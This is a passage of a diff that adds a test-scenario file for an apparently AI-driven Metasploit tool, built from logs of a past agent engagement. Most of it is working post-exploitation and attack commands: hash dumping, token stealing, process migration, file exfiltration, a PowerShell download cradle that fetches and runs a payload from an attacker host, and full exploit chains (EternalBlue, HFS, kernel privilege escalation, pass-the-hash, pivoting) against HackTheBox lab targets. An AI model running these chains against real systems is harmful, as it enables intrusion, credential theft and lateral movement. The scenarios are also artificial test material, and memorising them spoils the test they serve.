+Args: {session_id: 1, command: "hashdump", timeout: 60}
+Expected: success=true, output contains NTLM hashes (format: user:rid:lm:ntlm:::)
+Notes: Requires SYSTEM privileges. Essential for pass-the-hash lateral movement.
+
+## Scenario 81: ps - list processes
+Method: session_command
+Args: {session_id: 1, command: "ps", timeout: 30}
+Expected: success=true, output contains process list with PID, Name columns
+Notes: Process enumeration for migration targets or security product detection.
+
+## Scenario 82: ps with filter - find specific processes
+# From engagement: agent filtered for cmd.exe, svchost.exe, NT AUTHORITY
+Method: session_command
+Args: {session_id: 1, command: "ps -S svchost.exe", timeout: 30}
+Expected: success=true, output contains svchost.exe entries
+Notes: Filtered process search. svchost.exe processes are common migration targets
+  (run as SYSTEM, always present).
+
+## Scenario 83: ps filtered by user
+# From engagement: "ps -U NT" to find SYSTEM processes
+Method: session_command
+Args: {session_id: 1, command: "ps -U NT", timeout: 30}
+Expected: success=true, output contains NT AUTHORITY processes
+Notes: Find SYSTEM-owned processes for token stealing or migration.
+
+## Scenario 84: migrate to another process
+# From engagement: 12 migrate calls to various PIDs
+# Prerequisite: Use ps to identify stable SYSTEM process
+Method: session_command
+Args: {session_id: 1, command: "migrate 968", timeout: 60}
+Expected: success=true, output indicates migration success or failure
+Notes: Process migration for persistence and privilege inheritance. Engagement
+  showed migrations to PIDs: 904, 968, 1064, 1928, 3492, 3728, 7500, 8940, 9256, 9788, 10948, 45628.
+  Migration can fail if process is protected or wrong architecture.
+
+## Scenario 85: shell - drop to OS command shell
+# From engagement: 9 shell calls
+Method: session_command
+Args: {session_id: 1, command: "shell", timeout: 30}
+Expected: success=true, output may contain shell prompt
+Notes: Drops from meterpreter to Windows cmd.exe or Linux /bin/sh.
+  Creates sub-channel. Use "exit" to return to meterpreter. ShellSession
+  uses write/read polling with stable_count=3 (~1.5s no new data).
+
+## Scenario 86: background - background current session
+Method: session_command
+Args: {session_id: 1, command: "background", timeout: 15}
+Expected: success=true
+Notes: Returns to msf console. Session continues running.
+
+## Scenario 87: upload file to target
+# From engagement: 6 upload calls for Rubeus.exe, getflag.bat
+Method: session_command
+Args: {session_id: 1, command: "upload /session/artifacts/payload.exe C:\\Windows\\Temp\\payload.exe", timeout: 60}
+Expected: success=true, output contains upload progress/completion
+Notes: Uploads file from msf container to target via meterpreter channel.
+  Path is container-local (/session/artifacts/). Engagement showed various targets:
+  C:\\Windows\\Temp\\, C:\\Users\\Public\\.
+
+## Scenario 88: download file from target
+# From engagement: agent downloaded user.txt
+Method: session_command
+Args: {session_id: 1, command: "download C:\\Users\\Administrator\\Desktop\\root.txt /tmp/root.txt", timeout: 30}
+Expected: success=true, output contains download progress/completion
+Notes: Downloads file from target to msf container. Useful for exfiltrating flags,
+  credentials, or other artifacts.
+
+## Scenario 89: execute - run process on target with output capture
+# From engagement: many execute variants used
+Method: session_command
+Args: {session_id: 1, command: "execute -f cmd.exe -a \"/c whoami\" -c -H", timeout: 30}
+Expected: success=true, output contains username
+Notes: -f: file to execute, -a: arguments, -c: channel output, -H: hidden,
+  -i: interactive, -d: dummy process name, -t: use thread token.
+  Engagement showed extensive execute usage for running tools on target.
+
+## Scenario 90: execute - run PowerShell on target
+# From engagement: multiple PowerShell execution patterns
+Method: session_command
+Args: {session_id: 1, command: "execute -f powershell.exe -a \"-nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8080/payload')\" -H", timeout: 60}
+Expected: success=true, output indicates process started
+Notes: Download-cradle pattern for loading tools into memory. -H hides the window.
+
+## Scenario 91: execute - hidden notepad for process migration target
+# From engagement: 11 calls using notepad as migration target
+Method: session_command
+Args: {session_id: 1, command: "execute -f notepad.exe -H -c -d", timeout: 15}
+Expected: success=true, output contains PID of spawned process
+Notes: Common technique: spawn hidden notepad, then migrate into it for stability.
+  -d creates dummy process with alternate name. Used 7 times in engagement.
+
+## Scenario 92: execute - read flag file via cmd.exe
+# From engagement: agent used execute to read files
+Method: session_command
+Args: {session_id: 1, command: "execute -f cmd.exe -a \"/c type C:\\Users\\Administrator\\Desktop\\root.txt\" -H -c -i", timeout: 15}
+Expected: success=true, output contains file contents
+Notes: Alternative to "cat" meterpreter command. -c -i captures channeled output.
+
+## Scenario 93: load incognito - token manipulation extension
+# From engagement: 2 calls to load incognito
+Method: session_command
+Args: {session_id: 1, command: "load incognito", timeout: 30}
+Expected: success=true, output indicates extension loaded
+Notes: Incognito extension for token impersonation/delegation attacks.
+
+## Scenario 94: list_tokens - enumerate available tokens
+# Prerequisite: incognito loaded (Scenario 93)
+Method: session_command
+Args: {session_id: 1, command: "list_tokens -u", timeout: 30}
+Expected: success=true, output contains available tokens by user
+Notes: Lists delegation and impersonation tokens. Used for token stealing attacks.
+
+## Scenario 95: steal_token - impersonate another user
+# From engagement: agent stole token from PID 45628
+# Prerequisite: incognito loaded, target process identified
+Method: session_command
+Args: {session_id: 1, command: "steal_token 45628", timeout: 30}
+Expected: success=true, output indicates impersonation success
+Notes: Steals process token and impersonates that user. Used for privilege escalation
+  when process running as higher-privileged user is found.
+
+## Scenario 96: whoami in shell session
+# Prerequisite: Shell session (not meterpreter)
+Method: session_command
+Args: {session_id: 2, command: "whoami", timeout: 30}
+Expected: success=true, output contains username
+Notes: Shell sessions use write/read polling. Output may take longer than meterpreter.
+
+## Scenario 97: Multiple commands in shell session (Linux)
+# From engagement: compound commands for enumeration
+Method: session_command
+Args: {session_id: 2, command: "id && whoami && hostname", timeout: 30}
+Expected: success=true, output contains uid, username, hostname
+Notes: Shell sessions support command chaining. Useful for quick enumeration.
+
+## Scenario 98: Linux network enumeration in shell session
+# From engagement: container network discovery
+Method: session_command
+Args: {session_id: 2, command: "ip addr show 2>/dev/null || ifconfig 2>/dev/null", timeout: 30}
+Expected: success=true, output contains network interface info
+Notes: Common post-exploitation: discover network interfaces for pivoting.
+
+## Scenario 99: Route discovery in shell session
+# From engagement: agent discovered internal subnets
+Method: session_command
+Args: {session_id: 2, command: "ip route 2>/dev/null || route -n 2>/dev/null || cat /proc/net/route", timeout: 30}
+Expected: success=true, output contains routing table
+Notes: Routing table reveals adjacent networks for lateral movement.
+
+## Scenario 100: Container environment discovery
+# From engagement: agent identified container environment
+Method: session_command
+Args: {session_id: 2, command: "cat /etc/passwd", timeout: 30}
+Expected: success=true, output contains user entries
+Notes: Basic Linux enumeration. In containers, limited users visible.
+
+## Scenario 101: File system enumeration in shell session
+# From engagement: agent searched pgadmin storage directories
+Method: session_command
+Args: {session_id: 2, command: "ls -la /var/lib/pgadmin/storage/ 2>/dev/null", timeout: 30}
+Expected: success=true, output contains directory listing or error
+Notes: Application-specific file enumeration. Error redirection prevents shell hang.
+
+## Scenario 102: Network scanning from compromised container
+# From engagement: agent pinged internal subnet from container
+Method: session_command
+Args: {session_id: 2, command: "for i in 1 2 3 4 5 6 7 8 9 10; do ping -c1 -W1 172.18.0.$i 2>/dev/null | grep -o '172.18.0.[0-9]*' | head -1; done", timeout: 60}
+Expected: success=true, output contains discovered hosts
+Notes: Ping sweep from compromised host to discover internal network.
+  Timeout needs to be generous for sequential pings.
+
+## Scenario 103: Install tools on compromised container
+# From engagement: agent installed nfs-utils via apk
+Method: session_command
+Args: {session_id: 2, command: "apk add --no-cache nfs-utils 2>&1 | tail -5", timeout: 60}
+Expected: success=true, output contains installation result
+Notes: Installing tools on compromised containers is common for further exploitation.
+  Alpine uses apk, Debian uses apt-get.
+
+## Scenario 104: Run meterpreter command "run" (inline module execution)
+# From engagement: agent ran exploit module from within meterpreter
+Method: session_command
+Args: {session_id: 1, command: "run exploit/windows/local/cve_2024_30088_authz_basep LHOST=<LHOST> LPORT=4450", timeout: 300}
+Expected: success=true, output contains exploit execution output
+Notes: Alternative to using run_exploit: run local exploit directly from meterpreter.
+  Engagement showed 3 such calls. May block for long time on kernel exploits.
+
+## Scenario 105: Session command on non-existent session
+Method: session_command
+Args: {session_id: 99999, command: "whoami", timeout: 10}
+Expected: success=false, error contains "Session 99999 not found"
+Notes: Graceful handling of dead/non-existent sessions. Returns available session
+  IDs in error message: "Active sessions: [1, 3, 5]".
+
+## Scenario 106: Exit/terminate session
+# Prerequisite: Active session from prior scenarios
+Method: session_command
+Args: {session_id: 1, command: "exit", timeout: 15}
+Expected: success=true (exit command sent)
+Notes: Cleanup after exploitation. Session closes after exit command.
+  From engagement: 6 exit calls.
+
+## Scenario 107: Read from channel in meterpreter
+# From engagement: agent used "read" to get output from channels
+Method: session_command
+Args: {session_id: 1, command: "read 2", timeout: 15}
+Expected: success=true, output contains channel data or error
+Notes: Reads from a specific channel ID. Used to get output from execute commands
+  that created channels (-c flag). Engagement showed reads from channels 2, 3, 6.
+
+## Scenario 108: Long-running command timeout behavior
+Method: session_command
+Args: {session_id: 1, command: "execute -f powershell.exe -a \"-ep bypass -c Start-Sleep -Seconds 300\" -H", timeout: 10}
+Expected: success=true (command dispatched, does not wait for completion)
+Notes: Tests that session_command does not block indefinitely. For meterpreter,
+  run_with_output has its own timeout. For shell, stable_count breaks polling.
+
+## Scenario 109: cat flag file via meterpreter
+# From engagement: direct meterpreter cat command
+Method: session_command
+Args: {session_id: 1, command: "cat C:\\Users\\Administrator\\Desktop\\root.txt", timeout: 15}
+Expected: success=true, output contains flag hash
+Notes: Meterpreter's built-in cat command. Uses forward or backslash for Windows paths.
+
+## Scenario 110: Shell command with dir (Windows path listing)
+# From engagement: agent used shell -c for quick commands
+Method: session_command
+Args: {session_id: 1, command: "shell -c \"dir C:\\Windows\\Temp\\*.exe\"", timeout: 30}
+Expected: success=true, output contains directory listing
+Notes: shell -c runs a single command and returns to meterpreter. Avoids
+  needing to enter and exit shell mode.
+
+# =============================================================================
+# POST-EXPLOITATION MODULE SCENARIOS (post_module)
+# =============================================================================
+
+## Scenario 111: Autoroute for pivoting
+# Prerequisite: Meterpreter session with network access
+Method: post_module
+Args: {module: "post/multi/manage/autoroute", session_id: 1, options: {SUBNET: "10.10.10.0", NETMASK: "255.255.255.0"}, timeout: 60}
+Expected: success=true, raw_output contains "Route added"
+Notes: Essential for pivoting through compromised host to reach internal networks.
+  Adds route through session so other MSF modules can target internal IPs.
+
+## Scenario 112: Gather environment info
+# Prerequisite: Active meterpreter session
+# From engagement: one of 2 post_module calls
+Method: post_module
+Args: {module: "post/multi/gather/env", session_id: 1, timeout: 60}
+Expected: success=true, raw_output contains OS info and environment variables
+Notes: Quick environment enumeration via post module.
+
+## Scenario 113: Windows privilege information
+# From engagement: agent ran win_privs post module
+Method: post_module
+Args: {module: "post/windows/gather/win_privs", session_id: 1, timeout: 60}
+Expected: success=true, raw_output contains privilege information
+Notes: Detailed Windows privilege enumeration. Shows UAC status, integrity level,
+  and enabled privileges.
+
+## Scenario 114: Local exploit suggester
+# Prerequisite: Low-privilege session for privesc discovery
+Method: post_module
+Args: {module: "post/multi/recon/local_exploit_suggester", session_id: 1, timeout: 300}
+Expected: success=true, raw_output contains list of suggested local exploits
+Notes: Scans session for compatible local exploits. Long timeout needed as it
+  checks many modules. Essential step between initial shell and privilege escalation.
+
+## Scenario 115: Hashdump via post module (alternative to session command)
+Method: post_module
+Args: {module: "post/windows/gather/hashdump", session_id: 1, timeout: 60}
+Expected: success=true, raw_output contains NTLM hashes
+Notes: Alternative to meterpreter "hashdump" command. Works as post module with
+  structured output. Requires SYSTEM or equivalent privileges.
+
+## Scenario 116: Enumerate logged-on users
+Method: post_module
+Args: {module: "post/windows/gather/enum_logged_on_users", session_id: 1, timeout: 60}
+Expected: success=true, raw_output contains user information
+Notes: Identifies currently logged-on users. Useful for understanding active access.
+
+## Scenario 117: Enable RDP on target
+Method: post_module
+Args: {module: "post/windows/manage/enable_rdp", session_id: 1, timeout: 60}
+Expected: success=true, raw_output indicates RDP configuration
+Notes: Enables Remote Desktop and optionally creates a user. Useful for persistent access.
+
+## Scenario 118: SOCKS proxy setup
+Method: post_module
+Args: {module: "post/multi/manage/autoroute", session_id: 1, options: {SUBNET: "172.16.0.0", NETMASK: "255.255.0.0"}, timeout: 60}
+Expected: success=true, raw_output contains "Route added"
+Notes: Add route for internal subnet reachable through compromised host.
+  Follow up with auxiliary/server/socks_proxy for full SOCKS proxy chain.
+
+## Scenario 119: Post module with invalid session
+Method: post_module
+Args: {module: "post/multi/gather/env", session_id: 99999, timeout: 30}
+Expected: success=true (tool level), raw_output contains session error
+Notes: Module runs via console but fails on session -- should not crash.
+  Console output will contain the error message.
+
+## Scenario 120: Gather network configuration
+Method: post_module
+Args: {module: "post/windows/gather/arp_scanner", session_id: 1, options: {RHOSTS: "10.10.10.0/24"}, timeout: 120}
+Expected: success=true, raw_output contains ARP scan results
+Notes: ARP scanner from compromised host. Discovers live hosts on local subnet.
+
+# =============================================================================
+# ERROR HANDLING SCENARIOS
+# =============================================================================
+
+## Scenario 121: Tool-level error - msfrpcd connection failure
+# Prerequisite: Stop msfrpcd or block port 55553
+Method: list_sessions
+Args: {}
+Expected: success=false, error contains "Failed to connect to msfrpcd"
+Notes: _ensure_connected retries 30 times (2s each = 60s). After exhaustion,
+  raises ToolError. This is the only true tool-level failure path.
+
+## Scenario 122: Console timeout on slow command
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "10.10.10.0/24", timeout: 5}
+Expected: success varies, may raise timeout error
+Notes: _console_exec polls until !busy or timeout. With 5s timeout on subnet
+  scan, should hit timeout. Raises ToolError with partial output in details.
+
+## Scenario 123: Handler on privileged port (requires root)
+Method: handler
+Args: {payload: "windows_reverse_tcp", lhost: "<LHOST>", lport: 80}
+Expected: success=true, raw_output may contain "Permission denied" or bind failure
+Notes: Port 80 requires root in container. Tests error classification for bind failures.
+
+## Scenario 124: Agent method name confusion - "start_handler" (non-existent)
+# From engagement: agent called start_handler instead of handler (1 occurrence)
+Method: start_handler
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 9003}
+Expected: Error: Method "start_handler" not found, available methods listed
+Notes: Documents real agent confusion pattern. MCP framework returns method-not-found
+  with available methods list. Agent should learn to use "handler" instead.
+
+## Scenario 125: Agent method name confusion - "console_command" (non-existent)
+# From engagement: agent tried console_command to run gcc (1 occurrence)
+Method: console_command
+Args: {command: "gcc -o output input.c"}
+Expected: Error: Method "console_command" not found, available methods listed
+Notes: Agent confused exec_command with a direct console access method. No such method
+  exists; exec_command is the closest (requires module parameter).
+
+## Scenario 126: Agent method name confusion - "run_command" (non-existent)
+# From engagement: agent tried run_command for session interaction (1 occurrence)
+Method: run_command
+Args: {command: "sessions -i 1 -c 'whoami'"}
+Expected: Error: Method "run_command" not found, available methods listed
+Notes: Agent tried to interact with sessions via msf console syntax. Correct
+  approach: use session_command with session_id and command.
+
+## Scenario 127: Session key type mismatch (int vs str from msgpack)
+# Prerequisite: Active session
+Method: session_command
+Args: {session_id: 1, command: "getuid", timeout: 30}
+Expected: success=true (server handles both int and str keys)
+Notes: pymetasploit3 msgpack may return session IDs as int or str. Code handles
+  both: sessions.get(str(session_id)) or sessions.get(session_id).
+
+## Scenario 128: Connection lost mid-command (reconnection)
+# Prerequisite: Active connection, then msfrpcd restarts
+Method: search_modules
+Args: {query: "ms17_010"}
+Expected: success varies, may reconnect automatically
+Notes: _ensure_connected() checks self.client.core.version() and reconnects
+  if connection lost. Console is recreated on reconnect.
+
+# =============================================================================
+# CROSS-TOOL WORKFLOWS
+# =============================================================================
+
+## Workflow A: Blue (HTB) - Full EternalBlue exploitation chain
+# Box: Blue (10.10.10.40) - Windows 7 SP1 x64
+# Cross-tool: nmap (recon) -> metasploit (exploit) -> metasploit (post)
+#
+# Step 1: Search for MS17-010 modules
+Method: search_modules
+Args: {query: "ms17_010"}
+# Step 2: Check vulnerability
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "10.10.10.40", timeout: 120}
+# Step 3: Start handler
+Method: handler
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444}
+# Step 4: Run exploit
+Method: run_exploit
+Args: {module: "exploit/windows/smb/ms17_010_eternalblue", rhosts: "10.10.10.40", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444, timeout: 120}
+# Step 5: Verify session
+Method: list_sessions
+Args: {}
+# Step 6: System info
+Method: session_command
+Args: {session_id: 1, command: "sysinfo", timeout: 30}
+# Step 7: Check identity (should be SYSTEM)
+Method: session_command
+Args: {session_id: 1, command: "getuid", timeout: 15}
+# Step 8: Dump hashes
+Method: session_command
+Args: {session_id: 1, command: "hashdump", timeout: 60}
+# Step 9: Get flags
+Method: session_command
+Args: {session_id: 1, command: "cat C:\\Users\\haris\\Desktop\\user.txt", timeout: 15}
+Method: session_command
+Args: {session_id: 1, command: "cat C:\\Users\\Administrator\\Desktop\\root.txt", timeout: 15}
+Expected: Both flags retrieved. Full chain: search -> check -> handler -> exploit ->
+  session -> post-exploit.
+
+## Workflow B: Devel (HTB) - Web delivery via IIS + privesc
+# Box: Devel (10.10.10.5) - Windows 7, IIS 7.5, FTP anonymous
+# Cross-tool: nmap (recon) -> ftp (upload) -> metasploit (shell + privesc)
+#
+# Step 1: Generate ASPX payload
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444, format: "aspx"}
+# Step 2: Start handler
+Method: handler
+Args: {payload: "windows_reverse_tcp", lhost: "<LHOST>", lport: 4444}
+# Step 3: Upload ASPX via FTP (external to metasploit tool - use ftp tool)
+# Step 4: Trigger payload via HTTP (external to metasploit tool - use curl tool)
+# Step 5: List sessions
+Method: list_sessions
+Args: {}
+# Step 6: Check user context
+Method: session_command
+Args: {session_id: 1, command: "getuid", timeout: 15}
+# Step 7: Search for local exploit suggester
+Method: search_modules
+Args: {query: "suggest", type: "post"}
+# Step 8: Run local exploit suggester
+Method: post_module
+Args: {module: "post/multi/recon/local_exploit_suggester", session_id: 1, timeout: 300}
+# Step 9: Based on suggester output, run local exploit
+Method: run_exploit
+Args: {module: "exploit/windows/local/ms10_015_kitrap0d", payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4445, options: {SESSION: "1"}, timeout: 120}
+# Step 10: Check elevated session
+Method: session_command
+Args: {session_id: 2, command: "getuid", timeout: 15}
+Expected: Low-privilege session, suggester identifies privesc, elevated session obtained.
+
+## Workflow C: Optimum (HTB) - HFS exploitation + privesc
+# Box: Optimum (10.10.10.8) - Windows Server 2012 R2, HFS 2.3
+# Cross-tool: nmap (recon) -> metasploit (exploit) -> metasploit (privesc)
+#
+# Step 1: Search for HFS exploit
+Method: search_modules
+Args: {query: "rejetto"}
+# Step 2: Start handler
+Method: handler
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444}
+# Step 3: Run HFS exploit
+Method: run_exploit
+Args: {module: "exploit/windows/http/rejetto_hfs_exec", rhosts: "10.10.10.8", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444, options: {RPORT: 80}, timeout: 120}
+# Step 4: List sessions
+Method: list_sessions
+Args: {}
+# Step 5: Enumerate privileges
+Method: session_command
+Args: {session_id: 1, command: "getprivs", timeout: 30}
+# Step 6: Get user flag
+Method: session_command
+Args: {session_id: 1, command: "cat C:\\Users\\kostas\\Desktop\\user.txt", timeout: 15}
+# Step 7: Run local exploit suggester
+Method: post_module
+Args: {module: "post/multi/recon/local_exploit_suggester", session_id: 1, timeout: 300}
+# Step 8: Attempt kernel exploit for SYSTEM
+Method: run_exploit
+Args: {module: "exploit/windows/local/ms16_032_secondary_logon_handle_privesc", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4445, options: {SESSION: "1"}, timeout: 120}
+Expected: User-level shell, then privesc to SYSTEM via local exploit.
+
+## Workflow D: Web delivery + local kernel privesc (from engagement data)
+# From engagement: web_delivery shell -> CVE-2024-30088 kernel LPE (17 attempts)
+# Cross-tool: curl (recon) -> metasploit (web_delivery) -> metasploit (kernel exploit)
+#
+# Step 1: Start handler on high port
+Method: handler
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 9003}
+# Step 2: Set up web delivery server
+Method: run_exploit
+Args: {module: "exploit/multi/script/web_delivery", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 9003, options: {SRVHOST: "0.0.0.0", SRVPORT: 8891, TARGET: 2, DisablePayloadHandler: "true"}, timeout: 120}
+# Step 3: Deliver payload to target (external: have target fetch the download cradle)
+# Step 4: Verify session
+Method: list_sessions
+Args: {}
+# Step 5: Check current privilege level
+Method: session_command
+Args: {session_id: 1, command: "getuid", timeout: 15}
+# Step 6: Search for kernel exploit
+Method: search_modules
+Args: {query: "cve_2024_30088", type: "exploit"}
+# Step 7: Spawn stable process for migration
+Method: session_command
+Args: {session_id: 1, command: "execute -f notepad.exe -H -c -d", timeout: 15}
+# Step 8: Migrate into stable process
+Method: session_command
+Args: {session_id: 1, command: "migrate <PID>", timeout: 30}
+# Step 9: Start new handler for elevated session
+Method: handler
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 9011}
+# Step 10: Run kernel exploit
+Method: run_exploit
+Args: {module: "exploit/windows/local/cve_2024_30088_authz_basep", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 9011, options: {SESSION: "1", AutoCheck: "false", WfsDelay: "300"}, timeout: 600}
+# Step 11: Check for SYSTEM session
+Method: list_sessions
+Args: {}
+Method: session_command
+Args: {session_id: 2, command: "getuid", timeout: 15}
+Expected: Low-privilege shell via web_delivery, then SYSTEM via kernel exploit.
+  Expect multiple retries for kernel exploit (engagement: 17 attempts).
+
+## Workflow E: Pass-the-hash lateral movement
+# Cross-tool: metasploit (hashdump) -> metasploit (psexec)
+#
+# Step 1: Dump hashes from SYSTEM session
+Method: session_command
+Args: {session_id: 1, command: "hashdump", timeout: 60}
+# Step 2: Load incognito for token manipulation
+Method: session_command
+Args: {session_id: 1, command: "load incognito", timeout: 30}
+# Step 3: List available tokens
+Method: session_command
+Args: {session_id: 1, command: "list_tokens -u", timeout: 30}
+# Step 4: Use PsExec with obtained hash on another target
+Method: run_exploit
+Args: {module: "exploit/windows/smb/psexec", rhosts: "10.10.10.41", payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4451, options: {SMBUser: "Administrator", SMBPass: "aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>", SMBDomain: "."}, timeout: 120}
+Expected: Lateral movement to adjacent host via pass-the-hash.
+
+## Workflow F: Pivot through compromised host
+# Cross-tool: metasploit (initial shell) -> metasploit (autoroute) -> metasploit (exploit internal)
+#
+# Step 1: Set up autoroute through session
+Method: post_module
+Args: {module: "post/multi/manage/autoroute", session_id: 1, options: {SUBNET: "172.16.0.0", NETMASK: "255.255.0.0"}, timeout: 60}
+# Step 2: Verify routing
+Method: session_command
+Args: {session_id: 1, command: "run autoroute -p", timeout: 15}
+# Step 3: Scan internal network through pivot (via auxiliary module)
+Method: check_vuln
+Args: {module: "auxiliary/scanner/portscan/tcp", rhosts: "172.16.0.1-10", options: {PORTS: "22,80,443,445,3389"}, timeout: 300}
+# Step 4: Exploit internal target through pivot
+Method: run_exploit
+Args: {module: "exploit/windows/smb/psexec", rhosts: "172.16.0.5", payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4452, options: {SMBUser: "admin", SMBPass: "password"}, timeout: 120}
+Expected: Pivot through compromised host to reach and exploit internal targets.
+
+## Workflow G: Container escape via network discovery
+# From engagement: shell in Docker container -> discover internal network -> pivot
+#
+# Step 1: Identify container environment
+Method: session_command
+Args: {session_id: 1, command: "uname -a", timeout: 15}
+Method: session_command
+Args: {session_id: 1, command: "cat /etc/os-release | head -3", timeout: 15}
+# Step 2: Discover network interfaces
+Method: session_command
+Args: {session_id: 1, command: "ip addr show 2>/dev/null || ifconfig 2>/dev/null", timeout: 15}
+# Step 3: Discover routing table
+Method: session_command
+Args: {session_id: 1, command: "ip route 2>/dev/null || route -n 2>/dev/null", timeout: 15}
+# Step 4: Ping sweep internal network
+Method: session_command
+Args: {session_id: 1, command: "for i in 1 2 3 4 5; do ping -c1 -W1 172.18.0.$i 2>/dev/null | grep -o '172.18.0.[0-9]*' | head -1; done", timeout: 30}
+# Step 5: Enumerate discovered hosts
+Method: session_command
+Args: {session_id: 1, command: "env", timeout: 15}
+Expected: Container network discovered, internal hosts identified for further exploitation.
